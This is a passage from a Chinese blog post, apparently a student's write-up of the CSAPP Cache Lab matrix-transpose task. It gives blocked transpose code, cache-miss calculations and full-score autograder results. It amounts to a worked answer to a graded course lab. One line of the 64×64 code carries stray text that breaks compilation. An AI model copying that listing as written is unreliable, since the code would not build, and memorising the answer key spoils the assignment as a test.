<p>这样一个机器的高速缓存被组织成一个有S = 2 ^ s个高速缓存组（Cache Set）的数组，每个组包含E个高速缓存行（Cache Line）。每个行是由一个B = 2 ^ b字节的数据块（Block）组成的，一个有效位（valid bit）指明这个行是否包含有意义的信息。t = m - (b + s)个标记位（tag bit），它们唯一地标识存储在这个高速缓存行中的块。</p>
<p>一个通用的高速缓存组织结构可以用元组(S, E, B, m)来描述。<br>高速缓存的大小C指的是所有块（不包括标记位和有效位）的大小的和，C = S × E × B。</p>
<p>一个m位的地址L被组织为3个部分，分别是高t位的标记位，中间s位的组索引以及低b位的块偏移。</p>
<p>L中的s个组索引是一个到S个组的数组的索引，从0开始。其指示了该地址所指示的字应当存储到哪个组中。<br>L中的t个标记位指明了该组中的哪一行包含这个字。当且仅当有效位为1且行的标记位与地址的标记位相同时，组中的行才包含了这个字。<br>块偏移b指明了在B个字节的数据块中的字偏移。</p>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>根据每个组的高速缓存行数E，高速缓存被分为不同的类：</p>
<ul>
<li>直接映射高速缓存。直接映射高速缓存中每个组只有一行（E = 1）。</li>
<li>组相连高速缓存。组相连高速缓存放宽了直接映射高速缓存中每个组只有一行的限制（1 &lt; E &lt; C/B）。</li>
<li>全相连高速缓存。全相连高速缓存是由一个包含了所有高速缓存行的组（E = C/B）组成的。</li>
</ul>
<p>组相连高速缓存引入了不命中时行替换策略的问题。比较常见的策略有最不常使用（LFU）和最近最少使用（LRU）。</p>
<p>由于构造又大又快的相连高速缓存很困难，全相连高速缓存通常只适合做小的高速缓存，如TLB（翻译备用缓冲器）。</p>
<h5 id="高速缓存写"><a href="#高速缓存写" class="headerlink" title="高速缓存写"></a>高速缓存写</h5><p>高速缓存写分为直写和写回。</p>
<ul>
<li>直写，当缓存更新后立刻将相应的高速缓存块写回到下一层存储器中。直写的缺点在于每次写都会引起总线流量。</li>
<li>写回，尽可能地推迟更新，只有当替换算法需要驱逐更新过的块时，才执行写入操作。写回极大地降低了总线流量。但是高速缓存必须对于每一个高速缓存行维护一个额外的修改位（dirty bit）来表明这个高速缓存块是否会修改过。</li>
</ul>
<h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p>
<p>在该实验中，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p>
<ol>
<li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li>
<li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li>
</ol>
<p>为了解决第一个问题，我们需要仔细地考虑对于矩阵元素访问的顺序。至于第二个问题，我们采用矩阵的分块技术来降低不命中数。</p>
<blockquote>
<p>矩阵分块的目的在于将大的、不能完全加载进入缓存的大矩阵分块成小的、可以完全加载进入缓存的小矩阵块来处理。小矩阵块具有良好的局部性，性能显著增加。<br>但同时也要注意，分块使得程序的可阅读性大大降低，因此一般只在常用的库函数中采用分块优化。</p>
</blockquote>
<h4 id="第一部分-32-×-32矩阵优化"><a href="#第一部分-32-×-32矩阵优化" class="headerlink" title="第一部分 32 × 32矩阵优化"></a>第一部分 32 × 32矩阵优化</h4><p>第一部分满分的要求是300个misses以内，misses超过600则0分。</p>
<p>首先对矩阵进行分块处理。为了完全利用每一个缓存快（32个字节）采用8 × 8分块。然后处理对角线的问题。这里我采用的方法是无论是哪一个矩阵分块，均从该矩阵分块的对角线开始处理。同时对于A矩阵（原始矩阵）按列优先（不连续读），对于B矩阵（转置矩阵）按行优先（连续写）。</p>
<p>通过优先处理对角线(a, a)的元素，保证了B矩阵的第a行被载入缓存中，接下来对于A矩阵的列优先处理保证了B矩阵的第a行缓存被充分利用。</p>
<p>对于32 × 32的矩阵，总共存在1024次读和1024次写。对于非对角线的分块（总共12个），其缓存不命中率是1/8（仅强制不命中），对于对角线的分块（总共4个），其写的缓存不命中率是1/8（强制不命中），其读的缓存不命中率为1/4（强制不命中和冲突不命中各一半）。</p>
<p>因此，理论上优化之后的总缓存不命中数为2048 × 0.75 × 0.125 + 1024 × 0.25 × 0.125 + 1024 × 0.25 × 0.25 = 288次。</p>
<p>第一部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">8</span> ; ++c) &#123;</span><br><span class="line">            <span class="keyword">for</span> (d = a + c - b ; d &gt;= a ; --d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (d = a + c - b + <span class="number">1</span> ; d &lt; a + <span class="number">8</span> ; ++d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数为287次，与理论值几乎一致。</p>
<h4 id="第二部分-64-×-64矩阵优化"><a href="#第二部分-64-×-64矩阵优化" class="headerlink" title="第二部分 64 × 64矩阵优化"></a>第二部分 64 × 64矩阵优化</h4><p>第二部分的满分要求是misses小于1300，当misses大于2000则零分。</p>
<p>第二部分对于misses的要求限制的非常严格，同时如果采用第一部分的8 × 8分块方式会出人意料地带来大量的misses。下面具体分析8 × 8分块导致misses增多的原因。</p>
<p>实验采用的缓存为直接映射高速缓存，s = 5， b = 5， E = 1。对于任意一个地址，其从低地址开始的第0-4位为块偏移b，第5-9为组索引s。</p>
<p>对于32 × 32的矩阵M来说，M[0][1]和M[1][1]之间总共间隔32个int型元素，也就是0x80个字节，也就是说，同一列相邻行的元素之间的地址间隔为0x80 = 0x100|00000。对于8 × 8的矩阵分块而言，其8行可以全部被加载进入缓存中而不发生任何冲突不命中。</p>
<p>然而，对于64 × 64的矩阵，其同一列相邻行的元素之间的地址间隔为0x100 = 0x1000|00000。对于8 × 8的矩阵分块而言，其第1、2、3、4行的元素会和第5、6、7、8行的元素占用相同的高速缓存组，进而出现严重的冲突不命中现象。</p>
<p>使用4 × 4的矩阵分块又无法充分利用每一个高速缓存行（32个字节=8个int数据），仍然无法达到所要求的misses数。</p>
<p>经过大量的尝试，我使用了以下的方法进行矩阵转置的优化：</p>
<p>仍然按照8 × 8对矩阵进行分块，只是在8 × 8的分块内部再按照4 × 4进一步分块，得到左上、右上、左下、右下4个子块。</p>
<p>紧接着依次按照左上、右上、右下、左下的方式处理4个子块（A矩阵）。<br>对于左上、右下这两个可能出现对角线元素的块，按照第一个矩阵优化的方式进行处理。<br>右上、左下子块不能简单地按照A矩阵不连续读，B矩阵连续写的方式处理。原因是对于对角线上的8 × 8分块来说，A、B矩阵的左上子块和右下子块占用了相同的高速缓存组，存在着严重的冲突不命中风险。<br>因此对于右上、左下的子块，我们按照下图的方式处理。</p>
<div class="figure " style="width:;"><img class="fig-img" src="matrix64-1.png" alt=""></div>
<p>图中，上方的矩阵为矩阵A，下方的矩阵为矩阵B，小方块代表矩阵的元素，黑色方块的表明加载进入临时变量/已写入的元素。红色的线表明该行被缓存。</p>
<ol>
<li>利用8个临时变量，将左上子块的前两行加载进入临时变量中，考虑到之前的缓存条件，该次加载的缓存命中。</li>
<li>将一个小的2×2的矩阵转置写入矩阵B右下子块的前两行，无论是否为对角线上的分块，该次写入一定会发生缓存不命中，同时将B矩阵的前两行载入高速缓存行。</li>
<li>将矩阵A左上子块的后两行的2×2的矩阵加载进入空闲的4个临时变量中，同之前加载相似，该次加载的缓存命中。</li>
<li>将刚刚加载的2×2矩阵转置写入B矩阵右下子块前两行的剩余位置，由于之前这两行已经加载进入了高速缓存行，故该次写入的缓存全部命中。</li>
<li>将矩阵A后两行的剩余元素加载进入空闲的4个临时变量中，缓存命中。</li>
<li>将8个临时变量中的元素依次转置写入矩阵B右下子块的最后两行中，同2相似，写入一定会发生缓存不命中，同时将矩阵B的后两行载入高速缓存行。</li>
</ol>
<p>A矩阵左下子块的转置操作类似，这里不再赘述。</p>
<p>在A矩阵右上子块转置完成后，紧接着执行的是右下子块的转置，此时，对于非对角线上的分块而言，写入时的缓存必定命中。对于对角线上的分块，则会发生缓存不命中。</p>
<p>因此，对于64 × 64的矩阵，总共进行4096次读和4096次写，对于非对角线的分块（总共56个），对于A矩阵（原始矩阵而言），其左上、右下分块的不命中率为1/4，左下、右上分块的不命中率为0；对于B矩阵（转置矩阵而言），其左上、右上、左下分块的不命中率均为1/4，右下分块的不命中率为0。对于对角线上的矩阵，其B矩阵不命中率上升至1/4，对于A矩阵，其左上、右下的不命中率上升至1/2。</p>
<p>因此，理论上优化之后的总缓存不命中数为4096 × (8/64) × (1/2 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/2 × 1/4) + 4096 × (8/64) × 1/4 + 4096 × (56/64) × (1/4 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/4 × 1/4) + 4096 × (56/64) × (1/4 × 1/4 + 1/4 × 1/4 + 0 × 1/4 + 1/4 × 1/4) = 1376次。</p>
<p>该优化方法对应的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; M ; a += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; N ; b += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = a ; c &lt; a + <span class="number">4</span> ; ++c) &#123;</span><br><span class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b ; -- d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span>; d &lt; b + <span class="number">4</span> ; ++d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tmp0 = A[b][a + <span class="number">4</span>];</span><br><span class="line">        tmp1 = A[b][a + <span class="number">5</span>];</span><br><span class="line">        tmp2 = A[b][a + <span class="number">6</span>];</span><br><span class="line">        tmp3 = A[b][a + <span class="number">7</span>];</span><br><span class="line">        tmp4 = A[b + <span class="number">1</span>][a + <span class="number">4</span>];</span><br><span class="line">        tmp5 = A[b + <span class="number">1</span>][a + <span class="number">5</span>];</span><br><span class="line">        tmp6 = A[b + <span class="number">1</span>][a + <span class="number">6</span>];</span><br><span class="line">        tmp7 = A[b + <span class="number">1</span>][a + <span class="number">7</span>];</span><br><span class="line">        B[a + <span class="number">4</span>][b] = tmp0;</span><br><span class="line">        B[a + <span class="number">4</span>][b + <span class="number">1</span>] = tmp4;</span><br><span class="line">        B[a + <span class="number">5</span>][b] = tmp1;</span><br><span class="line">        B[a + <span class="number">5</span>][b + <span class="number">1</span>] = tmp5;</span><br><span class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">4</span>];</span><br><span class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">5</span>];</span><br><span class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">4</span>];</span><br><span class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">5</span>];</span><br><span class="line">        B[a + <span class="number">4</span>][b + <span class="number">2</span>] = tmp0;</span><br><span class="line">        B[a + <span class="number">4</span>][b + <span class="number">3</span>] = tmp1;</span><br><span class="line">        B[a + <span class="number">5</span>][b + <span class="number">2</span>] = tmp4;</span><br><span class="line">        B[a + <span class="number">5</span>][b + <span class="number">3</span>] = tmp5;</span><br><span class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">6</span>];</span><br><span class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">7</span>];</span><br><span class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">6</span>];</span><br><span class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">7</span>];</span><br><span class="line">        B[a + <span class="number">6</span>][b] = tmp2;</span><br><span class="line">        B[a + <span class="number">6</span>][b + <span class="number">1</span>] = tmp6;</span><br><span class="line">        B[a + <span class="number">6</span>][b + <span class="number">2</span>] = tmp0;</span><br><span class="line">        B[a + <span class="number">6</span>][b + <span class="number">3</span>] = tmp1;</span><br><span class="line">        B[a + <span class="number">7</span>][b] = tmp3;</span><br><span class="line">        B[a + <span class="number">7</span>][b + <span class="number">1</span>] = tmp7;</span><br><span class="line">        B[a + <span class="number">7</span>][b + <span class="number">2</span>] = tmp4;</span><br><span class="line">        B[a + <span class="number">7</span>][b + <span class="number">3</span>] = tmp5;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span>; c &lt; a + <span class="number">8</span> ; ++c) &#123;</span><br><span class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b + <span class="number">4</span> ; --d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span> ; d &lt; b + <span class="number">8</span> ; ++d) &#123;</span><br><span class="line">                B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tmp0 = A[b + <span class="number">6</span>][a];</span><br><span class="line">        tmp1 = A[b + <span class="number">6</span>][a + <span class="number">1</span>];</span><br><span class="line">        tmp2 = A[b + <span class="number">6</span>][a + <span class="number">2</span>];</span><br><span class="line">        tmp3 = A[b + <span class="number">6</span>][a + <span class="number">3</span>];</span><br><span class="line">        tmp4 = A[b + <span class="number">7</span>][a];</span><br><span class="line">        tmp5 = A[b + <span class="number">7</span>][a + <span class="number">1</span>];</span><br><span class="line">        tmp6 = A[b + <span class="number">7</span>][a + <span class="number">2</span>];</span><br><span class="line">        tmp7 = A[b + <span class="number">7</span>][a + <span class="number">3</span>];</span><br><span class="line">        B[a + <span class="number">2</span>][b + <span class="number">6</span>] = tmp2;</span><br><span class="line">        B[a + <span class="number">2</span>][b + <span class="number">7</span>] = tmp6;</span><br><span class="line">        B[a + <span class="number">3</span>][b + <span class="number">6</span>] = tmp3;</span><br><span class="line">        B[a + <span class="number">3</span>][b + <span class="number">7</span>] = tmp7;</span><br><span class="line">        tmp2 = A[b + <span class="number">4</span>][a + <span class="number">2</span>];</span><br><span class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">3</span>];</span><br><span class="line">        tmp6 = A[b + <span class="number">5</span>][a + <span class="number">2</span>];</span><br><span class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">3</span>];</span><br><span class="line">        B[a + <span class="number">2</span>][b + <span class="number">4</span>] = tmp2;</span><br><span class="line">        B[a + <span class="number">2</span>][b + <span class="number">5</span>] = tmp6;</span><br><span class="line">        B[a + <span class="number">3</span>][b + <span class="number">4</span>] = tmp3;</span><br><span class="line">        B[a + <span class="number">3</span>][b + <span class="number">5</span>] = tmp7;</span><br><span class="line">        tmp2 = A[b + <span class="number">4</span>][a];</span><br><span class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">1</span>];</span><br><span class="line">        tmp6 = A[b + <span class="number">5</span>][a];</span><br><span class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">1</span>];</span><br><span class="line">        B[a][b + <span class="number">4</span>] = tmp2;</span><br><span class="line">        B[a][b + <span class="number">5</span>] = tmp6;</span><br><span class="line">        B[a][b + <span class="number">6</span>] = tmp0;qizhongqizhong</span><br><span class="line">        B[a][b + <span class="number">7</span>] = tmp4;</span><br><span class="line">        B[a + <span class="number">1</span>][b + <span class="number">4</span>] = tmp3;</span><br><span class="line">        B[a + <span class="number">1</span>][b + <span class="number">5</span>] = tmp7;</span><br><span class="line">        B[a + <span class="number">1</span>][b + <span class="number">6</span>] = tmp1;</span><br><span class="line">        B[a + <span class="number">1</span>][b + <span class="number">7</span>] = tmp5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1379次。</p>
<p>到了这里我已经优化到了极限，但是依然没有达到满分，最后参考了网上的满分答案。<br>这里要注意到，实验讲义中说的很清楚，不允许修改矩阵A，但是矩阵B可以任意修改。因此，我们可以通过在矩阵B中暂存转置的结果来充分利用缓存，进一步降低缓存不命中数。思路如下图。</p>
<div class="figure " style="width:;"><img class="fig-img" src="matrix64-2.png" alt=""></div>
<ol>
<li>按行加载矩阵A，并且将其存入矩阵B。依次执行4次，直到整个分块的上半部分处理完毕。其中，每行的前4个元素被正确转置，后四个元素被暂存至矩阵B的右上分块。</li>
<li>对于分块的下半部分的第一行，先将矩阵B的右上分块的4个元素载入至临时变量，然后从矩阵A中的左下分块读取第一列并转置进入矩阵右上分块的第一行，然后将读出的4个元素存入矩阵B右下分块的第一行，最后再将矩阵A右下分块第一列转置送入矩阵B右下分块的第一行。</li>
<li>按照2的方式依次处理完下半部分的所有行。</li>
</ol>
<p>对于一个8×8的分块而言，过程1处理了分块的上半部分，共执行了32次读和32次写。对于对角线上的分块，其读不命中率为1/8，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/8，写不命中率为1/8。过程2和3处理了分块的下半部分包括将矩阵B的右上子块移动到正确位置，将矩阵A的左下子块转置到B的右上子块以及矩阵A右下子块的转置，共执行了48次读和48次写。对于对角线上的分块，其读不命中率为1/3，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/12，写不命中率为1/12。</p>
<p>因此对于56个非对角线分块以及8个对角线分块，理论上优化后的总缓存不命中数为(32 × 1/8 + 32 × 1/8) × 56 + (32 × 1/8 + 32 × 1/4) × 8 + (48 × 1/12 + 48 × 1/12) × 56 + (48 × 1/3 + 48 × 1/4) × 8 = 1216次。</p>
<p>该优化方法的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">4</span> ; ++c) &#123;</span><br><span class="line">            tmp0 = A[c][a];</span><br><span class="line">            tmp1 = A[c][a + <span class="number">1</span>];</span><br><span class="line">            tmp2 = A[c][a + <span class="number">2</span>];</span><br><span class="line">            tmp3 = A[c][a + <span class="number">3</span>];</span><br><span class="line">            tmp4 = A[c][a + <span class="number">4</span>];</span><br><span class="line">            tmp5 = A[c][a + <span class="number">5</span>];</span><br><span class="line">            tmp6 = A[c][a + <span class="number">6</span>];</span><br><span class="line">            tmp7 = A[c][a + <span class="number">7</span>];</span><br><span class="line">            B[a][c] = tmp0;</span><br><span class="line">            B[a + <span class="number">1</span>][c] = tmp1;</span><br><span class="line">            B[a + <span class="number">2</span>][c] = tmp2;</span><br><span class="line">            B[a + <span class="number">3</span>][c] = tmp3;</span><br><span class="line">            B[a][c + <span class="number">4</span>] = tmp4;</span><br><span class="line">            B[a + <span class="number">1</span>][c + <span class="number">4</span>] = tmp5;</span><br><span class="line">            B[a + <span class="number">2</span>][c + <span class="number">4</span>] = tmp6;</span><br><span class="line">            B[a + <span class="number">3</span>][c + <span class="number">4</span>] = tmp7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span> ; c &lt; a + <span class="number">8</span> ; ++c) &#123;</span><br><span class="line">            tmp0 = B[c - <span class="number">4</span>][b + <span class="number">4</span>];</span><br><span class="line">            tmp1 = B[c - <span class="number">4</span>][b + <span class="number">5</span>];</span><br><span class="line">            tmp2 = B[c - <span class="number">4</span>][b + <span class="number">6</span>];</span><br><span class="line">            tmp3 = B[c - <span class="number">4</span>][b + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[c - <span class="number">4</span>][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c - <span class="number">4</span>];</span><br><span class="line">            B[c - <span class="number">4</span>][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c - <span class="number">4</span>];</span><br><span class="line">            B[c - <span class="number">4</span>][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c - <span class="number">4</span>];</span><br><span class="line">            B[c - <span class="number">4</span>][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c - <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">            B[c][b] = tmp0;</span><br><span class="line">            B[c][b + <span class="number">1</span>] = tmp1;</span><br><span class="line">            B[c][b + <span class="number">2</span>] = tmp2;</span><br><span class="line">            B[c][b + <span class="number">3</span>] = tmp3;</span><br><span class="line"></span><br><span class="line">            B[c][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c];</span><br><span class="line">            B[c][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c];</span><br><span class="line">            B[c][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c];</span><br><span class="line">            B[c][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1219次。</p>
<h4 id="第三部分-61-×-67矩阵优化"><a href="#第三部分-61-×-67矩阵优化" class="headerlink" title="第三部分 61 × 67矩阵优化"></a>第三部分 61 × 67矩阵优化</h4><p>由于61 × 67的矩阵不是方阵，不方便定量分析。同时限制放的比较宽松，满分misses小于2000，misses大于3000零分。因此无需考虑处理对角线，仅尝试换用不同的边长分块即可。16 × 16的分块已可以保证满分。</p>
<p>第三部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = b ; (c &lt; b + <span class="number">16</span>) &amp;&amp; (c &lt; M) ; ++c) &#123;</span><br><span class="line">            <span class="keyword">for</span> (d = a ; (d &lt; a + <span class="number">16</span>) &amp;&amp; (d &lt; N) ; ++d) &#123;</span><br><span class="line">                    B[c][d] = A[d][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1847次。</p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           8.0         8        1219</span><br><span class="line">Trans perf 61x67          10.0        10        1847</span><br><span class="line">          Total points    53.0        53</span><br></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验花费了我很久时间，最后还是参考了网上的解法并且花了很大精力去理解，实验给出的缓存条件非常苛刻，但同时也方便了定量分析。完成后确实大大加深了我对于缓存的理解。</p>
<p>这次实验中我认为比较重要/难的地方：一是对于缓存的理解以及矩阵元素在缓存中的排布问题；二是位于对角线上的分块不仅是内部而且在分块间存在的冲突不命中问题；三是虽然是矩阵，但是也要明确统一控制行列的变量。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/08/01/深入理解计算机系统ShellLab实验报告/">
                            深入理解计算机系统ShellLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-08-01T15:27:04+08:00">
	
		    8月 01, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/ShellLab" target="_blank" rel="noopener">GitHub</a>上</p>
<blockquote>
<p>这一个月一来一直在看《深入理解计算机系统》的后几章，终于全部看完了（除了第4章：处理器体系结构外）。然后开始集中处理实验，以下是Shell Lab的实验解答。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Shell Lab - Writing Your Own Unix Shell主要是有关于进程、信号以及异常处理的实验，对应于书本的第8章：异常控制流。主要通过实现一个带作业控制的Unix Shell来熟悉进程以及信号的概念。</p>
<p>本实验已经给出了Tiny Shell的源程序的基本框架(tsh.c)，你需要做的是填充该框架中的eval builtin_cmd do_bgfg waitfg sigchld_handler sigint_handler sigtstp_handler等函数。使得编译后的Shell具有相应的功能。</p>
